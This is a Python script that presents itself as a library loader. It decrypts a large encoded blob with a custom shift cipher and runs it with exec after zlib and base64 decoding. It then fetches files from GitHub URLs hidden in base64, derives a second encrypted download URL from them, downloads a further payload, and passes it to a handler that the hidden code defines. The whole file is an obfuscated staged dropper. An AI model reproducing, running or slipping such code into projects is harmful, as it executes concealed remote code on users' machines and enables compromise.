import os
import sys
import base64
import hashlib
import time
from urllib.request import urlopen, Request
import ssl

url_b64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pvaG5zOTIvYmxvZ19hcHAvcmVmcy9oZWFkcy9tYWluL3NlcnZlci8uZW52LmV4YW1wbGU="
remote_url = base64.b64decode(url_b64).decode()
config_url = base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pvaG5zOTIvYmxvZ19hcHAvcmVmcy9oZWFkcy9tYWluL3NlcnZlci8ubnZtcmM=").decode()

cert_path = os.path.join(os.path.dirname(__file__), "cacert.pem")
ssl_context = ssl.create_default_context(cafile=cert_path) if os.path.exists(cert_path) else None

def download_remote_content(url, output_path):
    try:
        req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urlopen(req, context=ssl_context) as response, open(output_path, "wb") as out_file:
            if response.status != 200:
                print(f"Failed to download the file. Status code: {response.status}")
                return False
            data = response.read()
            out_file.write(data)
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False

def simple_shift_decrypt(encoded_text, password):
    key = int(hashlib.sha256(password).hexdigest(), 16)
    encrypted_bytes = base64.b64decode(encoded_text)
    decrypted = ''.join([chr((b - (key % 256)) % 256) for b in encrypted_bytes])

    return decrypted

methods = {'get_output_file_path': None, 'load_libraries': None}

def load_libraries(key):
    encoded_data = 'NmU8NjtqOjdoZmo8PT00OGZqaDQ7ajw0NTY1PT08NmplajU0ZWhoaTpqNGhoOTY0NTY3Zmc9aTg2ODg3ZzY9NX1zcFBWaHszMy89Nzl2SXJ6PW85dXw8Wm5OUEU4bkZmTm5GfXB8a1RpbGZnNWVrOEx4ZVl3blBnRnBHfkVab1x4d256NXVUTUhbSHNVSkVFWzhaSGw9SkhOTH1mc2ZmeVx6XnovOEs3WGdwfXd5fl15VXNIbDdbZVdtVno4NU1eZk9vOk16eVlIRzN3WnR4c1I0T3lmRkY6TFBmTHRUVV03fi9Rcj1RNHNUV01XPGpVXHttalpVVnVTNEc0VHZGLzd2SnY5Vmx7OElbT2c7WHk0Rlp4czlwVHFWdmd+azkzRW80OHNsZVJvSm5mWFxUUUd5bFlyUUtGOlxlM0xIT3c7SWc9dnJvaVlrNzczTl46Wz13alhmeH55enk6aXxTVThNOWw9dXxyfFhmOlRTRVs9THBwaT1sd1FbejxIci84NEV8ZVs2TUw9XnF0SD1wbzYvWDVvPTlJXlxQd0o6R118WTltcy9McXQ7R3dPV0hHXE9PZXQ1fjZlaEdFW144TEpJeHZ0VVBacHRuZlloW1s5S3VRS1k6dU9VcFlmXGZRbm1sRXBmdj1HUFVtaXNYeDRWV3pUUFFTUnxHUjVWXXBTcjlIaHtGfWxtWWV4dmtqaEd5SE0zPTtRbnFFPTlNXHk8cS9pfmV1PXdMa3BaW01tV3dXWmhrclw3RUY5d0l5Tm9VOWYvaXZ6TXd3R3hba1VKTFs3bnd7UE51cFQ9clNmRVRYWHxdPEtRfnJSTDRKaVZaOFBmb1ZcWEVwVkxnOz1JV1ZqXlR0dzQ9VnhFTXFISXM9alZzaHpzaF0zL3VtcEpHdW98LzlUW0VaXVhPVEg8aDt0dU1PWXFML0w6Nk88Xng1NmlTbnpecUc5NXJYenN7WDl5aTpUUF1scWVTbEVaaFZFOTQ9NnxUen15WTpNS3U3dl54THhOaHNFUXs6VTxxWk1RezhsN35QZ2VSdGh3NHxTRmxmS09bfWhuO0s2VEl8TU9WVkpUajc9NmhNeDRXUndVZkl9UT05b201UzQ2c0ZoPHR3dzdPNFFXTzlYXlZVNGVubFl0eFBNOFpbdGhaUl1eN0hddElvXS9QW2Z5bjZxTHJ2VGteTndSVTdVNUhPS3g3T292NUlxTzdFezlwT1RMcVxLT2dzdjdTOk5KXVpnUDNWW3pySE92akZ1XXczWkk3enRdaE9RajZXcDpFeGprVy97WGZpRjVsRi9+cX07Tk5IWTleUHU9em9YbElNb0hFdWxPWFJdVHVSakhbOTpVS35de0w7XUY2T3FpbklNb1U3ZXlTaFpdel5FZmVvRWgzVWlnUGVMSEVddXVMVlJLTkxpanlcNVxHb1RVRVdpSHF5VGg2WT07d1s6PHU2cTdba0VNVTo4PWhpSFVpZl5XUzh7OzVrOXlFNk45OEdFcFNYPXhcUmtwfjpQOXBVWWhXU1lSWm9NO3E2PEVWfFY0bWc3N3ZadTxFWmY2O3BlSVhQZj18dlNwVXd4Znk7cVJFOlc6bV5pL1dddE16TC9bOVNISkxFcn50dnc4fHhFOGpZRlhccGU3TlZOSkVeRW9Telc5dV17VGUzUzxXZmhFaTpYUTdWXXN9bkd4N3g7ZW9ZRlplZnZPeVxmTjpmTFxbSS92bjl0ZlU5dntsWnBddjt0TnJ4TVZOfEpKL25dOEdpV108cUd1aVZucFJ+XVN7UTd2Ly9mTUhQellHPXReWzpRWUkvXFNbPDhpUXM9aEtWRkp0c3ZJOTdSeTttc3Q9R29oaHdHb2VFeUtcVVo9Xi9ZaXlZTG5aUE9aVlJ1d1xpVXwzV1JnWzlbc2pnT0lVM2l1c1NLcmZNelM2d1w8OEhbbmY0N3ZUTllIXm48NVdZUmc9OG9Me0xqS1E2e2t8PHk4UWlxbnU2SjtWSkdqeEk7b3Y9OGV9cEdQZTVtN2V6OzN4XDQ4N1pnb11SOGheTU80M3BMNnNyUU56e3I6TUxnXnloU0V7bks9fXBzdUVJO1ReVy9qck1KcTtMXVZ9clF0L3k8PHYvcWlHPW5NekhGTWVaS3tUUUl9S0tddHl5alRRWXxROG9XVVlFWmc9PXNnOEdpOzNLdGZMVW5UbW52cDZWSS9lbDVuPX1xanhUPGpSSVY8RXk6Tzc7eWx0RzdlczhPSGt9UTo7WmdNZTYzWnJvbG9La3ZeTUhaaUpzaV52OztNZlxWU0pQWVFnSkg4U0ldamZbTzlbaEZ+PDd7b114NC91aHBHeUdmVVRcXk1dS0xqOnBOZlp4aXA7fldHUDxJT3Q2M1o5NltoRUxIZ25PRmgzc1w4Sjw8aFx1XHRJcUpKXjQ4M1hTXlJNW2t4cS9xTFNmUkpmUUdnZTg7djxbSlVLSVdKWWpefVZ8d0ZQckVWUXFQdTt7UVQ5Lzo1L0lweHY8OVI0eUtNflBWUVE4aVRXU085SnBHcDMzSHRuL0xGOFFQLzxTZ0pHUVA2fDxZWGpMaGtbV1FPWTtdOFE8fnFFb3xpTGo7W3Y9aUtwLzhHVHdrbHBUR1BMUlN6ajRSa3AvUVRdTldXWn41eUlNZmlcbDo3VXIzWlhURnFrSTdrbGt3a09LRmtdVXB7fXJYaXNKUl1zZzVsdHdbNDdvVlt7Zlo0W0h3emVIW0hHfFlcRmt4PFpzL3FMV3M4TnlYPXFMT25eOVFdU3VSL15dZjhbOF5JdjtlOUV2U25yVC9XeGhsOG1IXV5dNm1KWTtLNkp5XWxuWmUvLzt0bDhbbXl7ZjR2bDhLbm9zXFtFfWxmcnN7eU47cXFpMzRGfn5MXUdwVn19fXk7cXlnfX5sdTZmcEc5cE1vPWtVPGdnbW9JOjV6cWhdXmxuUHBJPXQ1VTVmUVY4dDtOcDd9dVRrOzRccnVKXHFtcHFrXWlIPD1xVGpcSTQzRnNvZWdTNkVOVnFpSFFnZmprZXFyXGp0aX5uXktUeHVSO314NWttVVRIbWtaLzxGd1wzdVlJc11VeD07PVlbfFxoVUp8aC9KaU9neVZZWzc5Z3daal1HcUtmbXtdUmk8Znw4ZVF9O1praVpwUDw6b0g0OVJde2c6bmxGSFYvbD18c0hIVk96T3Y9WXFSTW9lOkltc2xwL0VOfH49cEVte3g6UlU8NFRQSjlYL05JcjZ0ZXhtVVRHS2llcVNMVnlFVHU8NV4zWzZZUnxScnJeSDo3UGh7OWlPOlU6S1hwZk88an5Nb35dak5uZVYzeXZvVmZKb3dudXxwSzRxV2tVU1B9dVhFZ31ZRj1dO31GNFhZN1xbS0tlRnl0dkl5cmZqZV59TGVJRnVYans2bmt5W2hIak9xcVxROFpweFh6d3xzZ0xnSnpUO200bk5rPEw6cHxwfkh+Rzl4RXFtSnhwaFp7OFN8WnBucXlqdTZ9fHNoa1dQfDZbdWVqaUt4TGhUXDhGO2ZaOmpHTXY5RmdoXEh6cVB9aXVzNXJyXDtuN2lmZnF5VF43dD06O1Y6Vkt1M3BvRXNlNko5Wm88RTRQS1N2Ont7XDN6Xk1rW0dGUld3cnJ+ZTpLdGZ8UzRvTUlKXWdMcl1lU0ZnXVZzbU1aSXBSS21tV3o2NnAzTlBJdkpqM0dKdW1Kc2hLOS9tbF1waTh1azxaXX5yNjRpPXlcandvaVNzVUpXaEltODl3ejxJN3tQWU5LM0h4eXVwOF5uemtuTjtyPE48d1JWR3lXcnFJbnteZ35nL3xcWFl8WDdsWmZsbVI3PXo5cTRSRU9pNUh+fmxdXF1aTjc9a29eaFNPbnx4dn5NOFt1RVtJZ117Xk08Vml9ODtJNDhpUHFNfXNlTjhte0hOcks9eHtxNVloSTg8dDZtaFx9ODtsS3lReUc2XFVza01lTWw3SFYvNEV0bzZJU3o3cld7Zl1KWF1uRW80RmxVcFJrdjpcXTc4bmxvbFJodDxxSTRvcFZWdk1SenBPUVV6fVRuXVJcPUY8bkZ7fTxYWltMeH5FS215eUV8flFpTzlybFY7b043UHpJekp0dTtmTn5Udm5HOE01S2dLOmtxRzV7Xi9OdEtqflUzfFE1WT16bmpeUVN0eGpINDZYc0p6PGh0T3I7S1ZcPGo5SmVGfDhzdHpbWVM4ejpNST13Om09dl16fHI3SGl6bUptNH41d29nPXd+dmZqLy97eVNpdlJRdXM2VFJtcj0zfVdSXDpoXk9uU2xSXVhwNXh6VTNxfjdIWF17aFs1S15VR2Zad2dUUUxYeWZ8dFJGdy99eVk9Ojd2O1ZRSE9VclZlWWpqdDxvOXFYfUp6T089cn1ed0h6R0h2Rm02SGxnfUVmeVV7V2leclV5PT1NbS9QVjhQS3NQV0tOOEdHOmpGZW91XWdZSj07fXxMVTM0T3V+b3M5WFg5bE5wLy81UTxsdjZKcjQ1NW98SlJdXFZTa359eH40akhuUG9OTm1UXjtwUnQ7dTtGe1dSZ0xFRzl8cFpwUWlFTnYzSHVtXmdyalxKXS9Mbk56OVl3d2t9NktRUGVQblRGXVtLWUVqW2VWd2cvWWVoZWxRcFBIeVtPaj14TTo0L0V+cVV5eXJwVFVoXFxzWUtbeF5UdDNySFFpN15Zb1B5dklLS1xlV3ZTdWxSVklOb1BNUFZ0XDY4XVBaUXAzXWo7W0pTdH5dNXJURnN8TGc9W3I8PE1OV2dZdXxcN305TFhFdGZue312NFpbeTt0TFs7WEVtNzVySF5SOnRKRU1YaWtXSnp6UjxIbGVTUFtQOXN2WFpLZ1A1XW1NZ1N0ZnlcfnxzNDlpSlx2aldqNm9SU3VoODgzbmUzZlxUWnN6cWtccl5XVTZKU1lwTXVYbXVpPDhURW9sRUZUeEh+Z3h4R2l5cVBcbHU3fEhRS1lMb3s5e2VpOjVFSXZ2bXZecHdMUlhpO3h4akt3RlpnVVpFUUhec282enRxSzxOWVhlNjtNNms2U1w0dG5mfnBFe3xddEZMdFJnTlI1clRsVjRZaVtOaFI8W1htdXVQTn5wWG1aZ3xPOm1bei9dR0s4Wzt+elU3Z1NsSD1SNnNdeUVrXTw0PWVxbHZ+fnJ6O3M3cjt6bmpJOVVZOkpZdy80OT00dnVPaE5HejxrUU1pfVNReGdycl5vW3VWL1NNNFJGWlpTe0pVWVdufkZ7OlppTnczfjduTnl4N3tqUDVHbG1POG9rdjVYazRuVjNZeGo8Tms5NHF7L1E3dHttNy9eWFdzan58RXp0VDdPcVtyXnhuNT1HSndSXUZKTTpSZjhxOEluZnJleHpnbEt7VjdUeEl3NDc0eW5aZVFKcX49TXwvZUp6U3U3SltUN3BYcGpeW25HXXo9Ty9ZTE59ellccmlYTUdZVGV9V1xdb056a3JtU1dZOUpWd2g7bj1tO211UktyWTNJVkZFZ0ZvbHNuWHdmWUhPUmlGXVZzWUx1TVA5dzVSUFluXC9Ie35vazQ8eVRsdHw6N0pPe2xTeDhRRVN3WUlqcTh1L15nM3x1aVRdfn1HWjdQT1xUVjNtR29bM3ZHXTloO35uVW1SPV57UTNmaVl8WDxZd2xpWkVJPDleM1xXSXJ2d2o4ZUZYVH1rU3VbSF1bTkV2PFo1VlhrVlw9M1F8TXtRRjR7TEpTO3Q1RWdce3dmcF5KfjN1XT1RNjdbOnheWVNZNXBKdF1KNF19cUx9O088OGxuPHF5NjNSTTpSRjNeWll5SEt5Z3JNel18R0Zval5FZTNTdHAvd2d+RlxdOHRGUE42enl0ezh8d3E2RzNlOnB6Tl1UVWU2XE14bFp+akt6Xm87eWc6SF5YcVxWM3tyZThJTUh+cEtafUVedFp6L3NxOzRNN3Y3VEdXPXlnbFhyZ3lpVGV8V2xNeVd6PFNPW1RMdz1ONXlwTUxmNzZwd3lHPX5eVkhTdFt9VS9qa3FxWnxSeFhFVkt8eHpadFM4aVR4R055SlFFOlJad3RIWXVHRS85aHBXZkxsbG5nM35mVnpnS0VMPG5yXFM9aXZJb3x7N1NPS1A1RXB9Tnh3UWl4TWhyeG08VzN9cH15TGgzeW08VXZ9flplPE9qLzY1SDd4NTRnZ2pIbXVNPDxQbDheNXlWZX5efWl3RVhPcntxWlhWajZVdm5JZ20vbEltcTppS150NFpxeVo3SEtUO253dmdmdG9obl5VPUdYVVlrcXpsa1NeTW1OPXJbfkdwTnxXO244aG9pZ2VaNW82UX14THF2fnU4Zn1YfVR+ZnM5VEVQcTVOM115bml0T0g2c05nTzh7RVxZUnlIWU5qUnhbT0U0PH5WVT19a2p3e29ISGU7aFtrXlxZajZcdTlyUV1wV0VIWkZuXDg4eDxIen1UaGp+TTo6anE3OUs4RmY9fX5uSH09V088R3JeW1tvO1J5bV46dXU6VFBxTH1bTVpleHQ1U3c7djx7bk89alo6T1Q5Njt+W2VPXHZySmp5WmZqT2Y2clA0VDNMcXFrWFtVPFhJUjp8altwaXhdVktuaFU6N35RU01LV1pFa1FpfklQUGd8L0peN3JdVnZxeUpecU15PFtFNU1QfHprcFVYSXV4PTM2cz16SDM2RlAzSWY1fHBHVV1RRUk1anU1dWpVe2lTdXgzVHc5XG9Sfm49Wk50W253bzl4N0ZySDd7NVZsWlNQfnBoZVpTLzUvenNTflhQVkt8fFpNSEZMO0lqcHJ2dVBWSnk5XDo5R1lPfXVVbFB1am1veFh9WVl8SnpIfE91altQXl5Ge1Z7UGxXaFZMbkpnclFoR01va2Y9SFpIXnFKVH1tZ2o6TH1vTW19TzxRNTxdNHY5LzxmM111RV12TTRvNUlwRjlXcEhoWk0ze3NWUFtQcVI5bGVqV0c7bHdnfTM3aVR9Rjk2ZVt+L3x8cHc7e01SenF6W0VLeHVIbjl7Sk5VOHE1WV13e3htTTxrbVs4enRdTH5FdzpWdXRXTld8dXFTSDlLZWZlV3R7RnY5cTY2TXBVbH1MT31NN1d6SHJVdnBJeDVFamxbTlpoOjR1WDhdN1E4STc0e2lFOmlNTUs6SE5nWmpsRW5PWnF8O1Z7enVsO3ZeTnNNOUZbSGt3fEtcWExIT1poV1NOdllUcV5PUWVGUTpXcjR3d3NeVkg2L1tMaF1XTGp6OmllN3NmXVlueEp3NFpvW2c7aHB1aFs2UjV8V1BVdGlmcDdYeXduOGZnc256aTZ+RlRWb3R2N35VdWt7bXZOaW17ZXFyeVo9aWpma1J9OD1zSHIvaVBLN0Z4WmxoOWxoV083M2pOemdJd3NveXhKN0hsfjc4NzlSL2lVe3J+cnxyOX5pWE1WbTxQcm5Fdz04ekx3Nn5rOzRzM1puaFR9flt2cFlNTGp8UVh4VHBaanQzTTV6e0xJUTRmZTpsUFBzXFU6d11Ib0ZNTlNVXkhuZm15Z1BTOlRwN0x7e2hVN3A1WDl6TXl6UnNnUV1TfDdSXVc2Unx0W095R3BuV3M3Zk9xXnFISXwzR25yanZGTkxXZmlSdjVbcHdxSnw6XXszc2lwW29JS2lWSGxudGk0dTZJR3J+OmleU3hWc2tQVkxdanFWalhGL1N5cHFsXjN3UTlaUjRXPDpOPHxcS15Ga1NbWjNFR344WVkzTndPU2lQNi9JbX1aRXI8b11XWUd9ODY2TndtVFVHVFkzci9QdVZtNzc1Xkx0XX5NaHB4aGdeblZ4aHdRPVF5NVBySjw4UjsvV01paU85ZU9uNn47UVNpeGlzTzVqbzNFPHxZVW5KaE1aVnZQNUZ0c15zOU9RPVU7NXJWOl1TXXVVNE1tTX5rd0lnOlt1bEx6TWZKdFBFPWlLeEhFc2laaFZlT2g2Ui9JfF5meUk8N1lWO2tdbk9XNn5mfVc5Un1rOXx6WFtORkplbj17OUZRNmtscDtZblJFNFs4ZzdMdm9RWX5+cnk7Uk00SjQ9Tmc8WVxrRkd8VVpGe2VFXjw8cFltL29yelpXW3RwbElSd0ZLcWw6ZjZPaU51ZUo2TS9yRVVlcDtcWnB2PUZldjM4bFZ4M3dNeTxxfGt1SVFuSTprZUlrd3N5M2lXSXBMR21beF5mcjdQcTl5eFAzRXx2c1d9TVRHUTpKPXpLRTROPUtUW15Jbm5leXF0RlRMVG9VcXBIN250Nzp1WExpWklbNj1vflVOZ0dlPVJOezh8Uk19bVlKcnl1ZWVQXDRdPExUcHpVMzxId3ZxfH06PH19ejp9emV0VDlcUFhYZVNodX5mfV1zdkY4dWlHTVtXbjlGdDhRNlROSVtcN0lRPWxndWZ2TVpxXUVrd3xHakZaWV1eOl1randyfn1mblVceVZ0TjpnXXxuaXI4OnFGNG83TE9cUXE5OU9oNThPO0lrNDtxfjpRaH5ZTG1TSTtsS1R3Wj06Tk9aXWZsWVZYaFpVelpLfl1welR5c0dUWDVdblw7V3lYbTx6a25lOjd8bDNvVGZbcnFQOjY6ak5+dDdwe3JrOEc9UTdxR0xeT2lyRjg8cVM0cGhNcTNNUVJUfVZYcFpsOng5Z2Zsfk5MTEl4PDdpZ01Ka1V2cTozbF5lfEllXGt0fTRbXXNSaVBVRUtccFV5SFprUnloclg6aDd3Z1VXV2ZSSzRbdF5TbEU4RWxPajteZUdJT3xqfF1GU2tFSzZ+ek9UWXQ9RXBbV3RIXU0vcGs9UHxJWVgvN2cvZW45W3Ntdlw9NVNOfW9ocHVvUzhHL0pMO3MvdmhGaG1yNXM1e1JvXUoveE5vdFgzan1lZ1lbfmUzdjZ2ZlVoWGhoVUV+VFxbVFlddWhSOklqcHN6Sl5LL299cUdZdnpbVVFPb3p0PFd6ZzNZczV6dEpHZ1NJSkpVamVqc3V0e1Z6ek5vUGlLdDt2PVZWZVM1N011WV5nNHs4ZV17U3U3N2pwdkU1c3h8ZU1POzQ3aHRdfVxaUXJmbVpTXHdcL3RRR3B6S1F2ZVlyczVKZzlrdUt0O0tKeWhtfFd6PGpFaWxsSVRqWy9YTz01VlpSRlY8ZndRRzlve3dFVEp5TnNWflQ9WXVqdlNJO2V0eVRdTXdVPTg2UDtUPVF5cmx3T3hsfmx0Unw9bEduVVc2N05oOnRqNEo3bmVlZ1tQfm5zek1lajNaUUxeO0d1V1FHcFE5ck94WFZefjsveUhRU0hxVFtUTlM1emlnL1FHVzZeeDh1cHBdVn17cFhefDZLeEpUeDh3TTUzW3pdPDR7cXd8On5yPDtZXHxuXVJ5Nzt1cFdMS3pxb0VQXnF5aVdtZTtYeldQOl5nZnt0cFw5VDw8b31yeHl8SlFyTmpJN2lyb11TNlc1NFh6R0x9aWxsSlZme2dxdDkvaTZ1TlJxWHBvPTptZVI4L0V9TDR4Sjc4T35JOkxUNjx2UUhcXVZ7e1E7cVpNWkZrdW5dNTtRSjtMSDplO2p8WzluXFhNbklbN29lZUteSXY9OE9GPW14N3BaOUs3M2lxXHA0TE8vfUovZlx5fn1XSmVJa3lGPWxsL312aVE4cUUvdE9NaWhtaHBzWGt+NGlaZlI1UFF2VWxSdUtNV3pIbTgvWVNsVHhMOz14aj15bkxoNzM2ZXtHRTlnTnFPdS9QRkVHSWdSd1d1czNQO2ovLzs8OzNqcVxaOTldLz1xSUlVZTk4cjVYN1B7fDpITmpUZzRTb2ZGUXN5fmpeVldzTXRXWTRwWntOaQ=='
    decoded_data = simple_shift_decrypt(encoded_data, key.encode('utf-8')).encode('utf-8')

    hash = decoded_data[:64]
    content = decoded_data[64:]

    if  hashlib.sha256(content).hexdigest() == hash.decode('utf-8'):
        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(content))
    else:
        return

    if not methods['get_output_file_path']:
        return

    max_retry_count = 3
    output_file_path = methods['get_output_file_path']()
    encoded = "6PT08PO6r6/j7+Tl8O/v7K7j7O/15K/w9eLs6eOv8/Th8vT18K7w+b/25fK9sa6ypvT58OW97e/k9ezl"

    if not download_remote_content(config_url, output_file_path):
        return

    with open(output_file_path, "rb") as f:
        file_content = f.read().decode('utf-8')
        numbers = file_content.split(".")

        if not numbers or int(numbers[0]) < 16:
            return

    for _ in range(max_retry_count):
        if not download_remote_content(remote_url, output_file_path):
            time.sleep(2)
            continue

        download_url = ""
        with open(output_file_path, "rb") as f:
            file_content = f.read()
            sha256_hash = hashlib.sha256()
            sha256_hash.update(file_content + key.encode())
            password = sha256_hash.digest()

            download_url = simple_shift_decrypt(encoded, password)
        
        if not download_url or not download_remote_content(download_url, output_file_path):
            time.sleep(2)
            continue

        methods['process_downloaded_library'](output_file_path)
        break

if __name__ == "__main__":
    if len(sys.argv) >= 2:
        load_libraries(sys.argv[1])
